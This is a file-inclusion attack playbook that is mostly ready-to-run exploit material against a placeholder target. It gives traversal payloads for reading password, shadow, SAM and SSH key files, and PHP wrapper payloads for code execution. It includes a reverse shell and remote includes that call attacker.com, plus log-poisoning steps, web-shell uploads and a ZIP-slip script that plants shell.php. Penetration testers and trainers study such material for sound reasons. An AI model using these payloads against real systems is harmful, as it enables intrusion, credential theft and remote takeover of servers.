# LFI/RFI (Local/Remote File Inclusion) Playbook

## Indicators

Signs this vulnerability may be present:
- URL parameters with file-like values (`page=home`, `file=report.pdf`, `template=default`)
- Parameters containing paths or extensions (`include=header.php`, `path=../config`)
- Dynamic content loading based on user input
- Error messages revealing file paths or include failures
- Application serves static files through a PHP/dynamic handler
- URL patterns like `?lang=en` or `?module=dashboard`
- File download functionality with user-controlled filenames
- Template or theme selection features

## Tools

### Manual Testing with curl

```bash
# Basic LFI test - Linux
curl "http://target.com/page.php?file=../../../etc/passwd"
curl "http://target.com/page.php?file=....//....//....//etc/passwd"

# Basic LFI test - Windows
curl "http://target.com/page.php?file=../../../Windows/win.ini"
curl "http://target.com/page.php?file=..\..\..\..\Windows\win.ini"

# Null byte injection (PHP < 5.3.4)
curl "http://target.com/page.php?file=../../../etc/passwd%00"
curl "http://target.com/page.php?file=../../../etc/passwd%00.php"

# Double URL encoding
curl "http://target.com/page.php?file=%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd"

# PHP filter wrapper - read source code
curl "http://target.com/page.php?file=php://filter/convert.base64-encode/resource=index.php"
curl "http://target.com/page.php?file=php://filter/read=string.rot13/resource=index.php"

# PHP input wrapper - code execution
curl -X POST "http://target.com/page.php?file=php://input" \
  -d "<?php system('id'); ?>"

# Data wrapper - code execution
curl "http://target.com/page.php?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg=="

# Expect wrapper - command execution (if enabled)
curl "http://target.com/page.php?file=expect://id"

# RFI - Remote File Inclusion
curl "http://target.com/page.php?file=http://attacker.com/shell.txt"
curl "http://target.com/page.php?file=https://attacker.com/shell.txt"
curl "http://target.com/page.php?file=ftp://attacker.com/shell.txt"
```

### ffuf for Parameter Fuzzing

```bash
# Fuzz for LFI-vulnerable parameters
ffuf -u "http://target.com/page.php?FUZZ=../../../etc/passwd" \
  -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
  -fs 0

# Fuzz with different traversal depths
ffuf -u "http://target.com/page.php?file=FUZZ" \
  -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt \
  -fs 0

# Fuzz file paths on Linux
ffuf -u "http://target.com/page.php?file=../../../FUZZ" \
  -w /usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt \
  -fs 0

# Fuzz file paths on Windows
ffuf -u "http://target.com/page.php?file=../../../FUZZ" \
  -w /usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-windows.txt \
  -fs 0

# Fuzz with wrapper payloads
ffuf -u "http://target.com/page.php?file=FUZZ" \
  -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt \
  -mc 200 -fs 0
```

### Python LFI/RFI Testing

```python
#!/usr/bin/env python3
import requests
import base64
import sys
from urllib.parse import quote

target = "http://target.com/page.php"
param = "file"

def test_lfi_basic():
    """Test basic path traversal"""
    payloads = [
        "../../../etc/passwd",
        "....//....//....//etc/passwd",
        "../../../etc/passwd%00",
        "..%2f..%2f..%2fetc%2fpasswd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "....\/....\/....\/etc/passwd",
        "../../../etc/passwd\x00",
    ]

    for payload in payloads:
        url = f"{target}?{param}={payload}"
        try:
            response = requests.get(url, timeout=10)
            if "root:" in response.text:
                print(f"[+] LFI confirmed with: {payload}")
                return payload
        except Exception as e:
            print(f"[-] Error: {e}")
    return None

def test_php_wrappers():
    """Test PHP wrapper techniques"""
    wrappers = {
        "php://filter base64": f"php://filter/convert.base64-encode/resource=index.php",
        "php://filter rot13": f"php://filter/read=string.rot13/resource=index.php",
        "data:// base64": f"data://text/plain;base64,{base64.b64encode(b'<?php phpinfo(); ?>').decode()}",
        "expect://": "expect://id",
    }

    for name, payload in wrappers.items():
        url = f"{target}?{param}={quote(payload)}"
        try:
            response = requests.get(url, timeout=10)
            if len(response.text) > 100:
                print(f"[+] {name} may work: {len(response.text)} bytes")
        except Exception as e:
            print(f"[-] {name}: {e}")

def test_php_input():
    """Test php://input for RCE"""
    url = f"{target}?{param}=php://input"
    code = "<?php echo shell_exec('id'); ?>"
    try:
        response = requests.post(url, data=code, timeout=10)
        if "uid=" in response.text:
            print(f"[+] RCE via php://input confirmed!")
            return True
    except Exception as e:
        print(f"[-] php://input error: {e}")
    return False

def test_rfi():
    """Test Remote File Inclusion"""
    attacker_url = "http://attacker.com/shell.txt"
    protocols = ["http://", "https://", "ftp://", "//"]

    for proto in protocols:
        url = f"{target}?{param}={proto}attacker.com/shell.txt"
        try:
            response = requests.get(url, timeout=10)
            print(f"RFI {proto}: Status {response.status_code}, Length {len(response.text)}")
        except Exception as e:
            print(f"[-] RFI {proto}: {e}")

def read_file(filepath):
    """Read arbitrary file using confirmed LFI"""
    # Adjust traversal depth as needed
    payload = f"....//....//....//....//..../{filepath}"
    url = f"{target}?{param}={payload}"
    response = requests.get(url)
    return response.text

def read_source(filename):
    """Read PHP source using filter wrapper"""
    payload = f"php://filter/convert.base64-encode/resource={filename}"
    url = f"{target}?{param}={quote(payload)}"
    response = requests.get(url)
    try:
        decoded = base64.b64decode(response.text).decode()
        return decoded
    except:
        return response.text

if __name__ == "__main__":
    print("[*] Testing LFI...")
    test_lfi_basic()
    print("\n[*] Testing PHP wrappers...")
    test_php_wrappers()
    print("\n[*] Testing php://input...")
    test_php_input()
    print("\n[*] Testing RFI...")
    test_rfi()
```

## Techniques

### 1. Basic Path Traversal

Navigate directory structure to access files outside the web root.

```bash
# Standard traversal
../../../etc/passwd
../../../etc/shadow
../../../home/user/.ssh/id_rsa

# With URL encoding
..%2f..%2f..%2fetc%2fpasswd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd

# Windows paths
..\..\..\Windows\win.ini
..\..\..\Windows\System32\config\SAM
..%5c..%5c..%5cWindows%5cwin.ini
```

Linux target files:
```
/etc/passwd
/etc/shadow
/etc/hosts
/etc/hostname
/etc/issue
/etc/motd
/etc/crontab
/etc/ssh/sshd_config
/proc/self/environ
/proc/self/cmdline
/proc/self/fd/0
/proc/version
/var/log/apache2/access.log
/var/log/apache2/error.log
/var/log/nginx/access.log
/var/log/auth.log
/var/log/syslog
/home/user/.bash_history
/home/user/.ssh/id_rsa
/home/user/.ssh/authorized_keys
/root/.bash_history
/root/.ssh/id_rsa
```

Windows target files:
```
C:\Windows\win.ini
C:\Windows\System32\drivers\etc\hosts
C:\Windows\System32\config\SAM
C:\Windows\System32\config\SYSTEM
C:\Windows\repair\SAM
C:\inetpub\logs\LogFiles\
C:\inetpub\wwwroot\web.config
C:\xampp\apache\logs\access.log
C:\xampp\apache\logs\error.log
C:\Users\Administrator\Desktop\
C:\boot.ini
```

### 2. Null Byte Injection

Terminate string early to bypass extension checks (PHP < 5.3.4).

```bash
# If application appends .php extension
../../../etc/passwd%00
../../../etc/passwd%00.php
../../../etc/passwd\0
../../../etc/passwd\x00

# URL encoded null byte variations
..%2f..%2f..%2fetc%2fpasswd%00
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd%00
```

```php
// Vulnerable code
include($_GET['page'] . '.php');

// Exploit
?page=../../../etc/passwd%00
// After null byte, .php is ignored
```

### 3. Double/Triple Encoding

Bypass WAF and input filters.

```bash
# Single URL encoding
..%2f..%2f..%2fetc%2fpasswd

# Double URL encoding
%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd

# Triple URL encoding
%25252e%25252e%25252f%25252e%25252e%25252f%25252e%25252e%25252fetc%25252fpasswd

# Mixed encoding
..%252f..%252f..%252fetc/passwd
%2e%2e/%2e%2e/%2e%2e/etc/passwd
```

### 4. PHP Wrappers

Leverage PHP stream wrappers for advanced exploitation.

#### php://filter (Read Source Code)
```bash
# Base64 encode to read PHP files
php://filter/convert.base64-encode/resource=index.php
php://filter/convert.base64-encode/resource=config.php
php://filter/convert.base64-encode/resource=../config/database.php

# ROT13 encoding
php://filter/read=string.rot13/resource=index.php

# Multiple filters chained
php://filter/string.toupper|convert.base64-encode/resource=index.php

# Zlib compression
php://filter/zlib.deflate/convert.base64-encode/resource=index.php
```

#### php://input (RCE)
```bash
# Send PHP code in POST body
curl -X POST "http://target.com/page.php?file=php://input" \
  -d "<?php system('id'); ?>"

curl -X POST "http://target.com/page.php?file=php://input" \
  -d "<?php echo file_get_contents('/etc/passwd'); ?>"

# Reverse shell
curl -X POST "http://target.com/page.php?file=php://input" \
  -d "<?php system('bash -i >& /dev/tcp/attacker.com/4444 0>&1'); ?>"
```

#### data:// (RCE)
```bash
# Base64 encoded PHP code
data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==

# URL encoded PHP code
data://text/plain,<?php%20system('id');%20?>

# With MIME type
data://text/html;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==
```

```python
# Generate data:// payloads
import base64
cmd = "id"
code = f"<?php system('{cmd}'); ?>"
encoded = base64.b64encode(code.encode()).decode()
print(f"data://text/plain;base64,{encoded}")
```

#### expect:// (RCE)
```bash
# Requires expect wrapper to be enabled
expect://id
expect://whoami
expect://cat%20/etc/passwd
```

#### zip:// and phar://
```bash
# Create malicious ZIP
echo "<?php system('id'); ?>" > shell.php
zip shell.zip shell.php

# Upload and include
zip://path/to/shell.zip%23shell.php
phar://path/to/shell.phar/shell.php
```

### 5. Log Poisoning

Inject PHP code into log files, then include them.

#### Apache/Nginx Access Log Poisoning
```bash
# Step 1: Inject PHP code via User-Agent
curl "http://target.com/" -H "User-Agent: <?php system(\$_GET['cmd']); ?>"

# Or via Referer
curl "http://target.com/" -H "Referer: <?php system(\$_GET['cmd']); ?>"

# Step 2: Include the log file
curl "http://target.com/page.php?file=/var/log/apache2/access.log&cmd=id"
curl "http://target.com/page.php?file=/var/log/nginx/access.log&cmd=id"
```

Log file locations:
```
# Apache
/var/log/apache2/access.log
/var/log/apache2/error.log
/var/log/httpd/access_log
/var/log/httpd/error_log
/usr/local/apache2/logs/access_log
/usr/local/apache2/logs/error_log

# Nginx
/var/log/nginx/access.log
/var/log/nginx/error.log

# Other
/var/log/auth.log
/var/log/mail.log
/var/log/vsftpd.log
/proc/self/fd/0
/proc/self/environ
```

#### SSH Log Poisoning
```bash
# Step 1: Inject via SSH username (requires SSH access attempt)
ssh "<?php system(\$_GET['cmd']); ?>"@target.com

# Step 2: Include auth log
curl "http://target.com/page.php?file=/var/log/auth.log&cmd=id"
```

#### Mail Log Poisoning
```bash
# Step 1: Send email with PHP code
telnet target.com 25
HELO attacker.com
MAIL FROM: <?php system($_GET['cmd']); ?>
RCPT TO: user@target.com
DATA
.
QUIT

# Step 2: Include mail log
curl "http://target.com/page.php?file=/var/log/mail.log&cmd=id"
```

#### /proc/self/environ Poisoning
```bash
# Step 1: Inject via User-Agent (stored in environ)
curl "http://target.com/" -H "User-Agent: <?php system('id'); ?>"

# Step 2: Include environ
curl "http://target.com/page.php?file=/proc/self/environ"
```

### 6. Remote File Inclusion (RFI)

Include files from remote servers (requires `allow_url_include=On`).

```bash
# Basic RFI
http://target.com/page.php?file=http://attacker.com/shell.txt
http://target.com/page.php?file=https://attacker.com/shell.txt
http://target.com/page.php?file=ftp://attacker.com/shell.txt

# Protocol-relative
http://target.com/page.php?file=//attacker.com/shell.txt

# With null byte (PHP < 5.3.4)
http://target.com/page.php?file=http://attacker.com/shell.txt%00

# SMB share (Windows)
http://target.com/page.php?file=\\attacker.com\share\shell.php
```

Host the malicious file:
```bash
# Create shell.txt on attacker server
echo "<?php system(\$_GET['cmd']); ?>" > shell.txt
python3 -m http.server 80
```

### 7. ZIP Slip / Path Traversal in Archives

Exploit file upload accepting ZIP files with malicious paths.

```python
#!/usr/bin/env python3
import zipfile
import io

# Create malicious ZIP with path traversal
mf = io.BytesIO()
with zipfile.ZipFile(mf, mode="w", compression=zipfile.ZIP_DEFLATED) as zf:
    # Write file to parent directories
    zf.writestr("../../../var/www/html/shell.php", "<?php system($_GET['cmd']); ?>")

with open("malicious.zip", "wb") as f:
    f.write(mf.getvalue())

print("Malicious ZIP created: malicious.zip")
```

```bash
# Manual ZIP creation with traversal
mkdir -p "../../var/www/html"
echo "<?php system(\$_GET['cmd']); ?>" > "../../var/www/html/shell.php"
zip -r malicious.zip "../../var/www/html/shell.php"
```

## Bypass Techniques

### Filter Evasion

```bash
# Nested traversal (if ../ is removed once)
....//....//....//etc/passwd
..../..../..../etc/passwd
....\/....\/....\/etc/passwd
....\\....\\....\\etc/passwd

# Unicode/UTF-8 encoding
..%c0%af..%c0%af..%c0%afetc/passwd
..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc/passwd

# Overlong UTF-8
%c0%2e%c0%2e%c0%af

# Case variations (Windows)
..\..\Windows\WIN.INI
..\..\WINDOWS\win.ini

# Path truncation
../../../etc/passwd.............[ADD MORE DOTS].............
../../../etc/passwd/./././././././.[CONTINUE]

# Mixed slashes
..\/..\/..\/etc/passwd
../..\\../etc/passwd
```

### Extension Bypass

```bash
# Null byte (PHP < 5.3.4)
../../../etc/passwd%00
../../../etc/passwd%00.php
../../../etc/passwd%00.jpg

# Long filename truncation (older PHP versions)
../../../etc/passwd/.[REPEAT UNTIL TRUNCATION]

# Double extension
../../../etc/passwd.php.jpg

# Adding extra paths
../../../etc/passwd/.
../../../etc/passwd/./
```

### Wrapper Protocol Bypass

```bash
# If http:// is blocked, try:
hTtP://attacker.com/shell.txt
HTTP://attacker.com/shell.txt
HtTp://attacker.com/shell.txt

# Protocol variations
http:/attacker.com/shell.txt
http:\\attacker.com\shell.txt

# Using @ for credentials
http://user@attacker.com/shell.txt

# IPv6
http://[::1]/shell.txt
http://[::ffff:127.0.0.1]/shell.txt
```

### Path Normalization Bypass

```bash
# Dot segments
../../.././etc/./passwd
../../../etc/passwd/.
/var/www/html/../../../etc/passwd

# Backslash on Windows
..\..\..\Windows\win.ini
..%5c..%5c..%5cWindows%5cwin.ini

# Forward slash encoding on Windows
..%2f..%2f..%2fWindows%2fwin.ini
```

## File Upload to LFI

When combined with file upload vulnerabilities:

```bash
# Upload PHP file with image extension
# (If validation checks only extension)
mv shell.php shell.php.jpg

# Upload with double extension
shell.php.jpg
shell.jpg.php

# Add magic bytes for image validation
echo -e "\xff\xd8\xff\xe0<?php system(\$_GET['cmd']); ?>" > shell.php.jpg

# GIF header
echo -e "GIF89a<?php system(\$_GET['cmd']); ?>" > shell.gif
```

Then include via LFI:
```bash
curl "http://target.com/page.php?file=../uploads/shell.php.jpg&cmd=id"
```

## Success Indicators

- Contents of `/etc/passwd` or `C:\Windows\win.ini` displayed
- Base64-encoded source code returned (php://filter)
- Command output visible in response (RCE achieved)
- HTTP request received at attacker server (RFI working)
- Error messages revealing full file paths
- Different response sizes for existing vs non-existing files
- Application behavior changes when including different files
- PHP source code visible (wrapper bypass of PHP execution)
- Log file contents returned (log poisoning preparation)
- Successful shell upload via ZIP slip confirmed
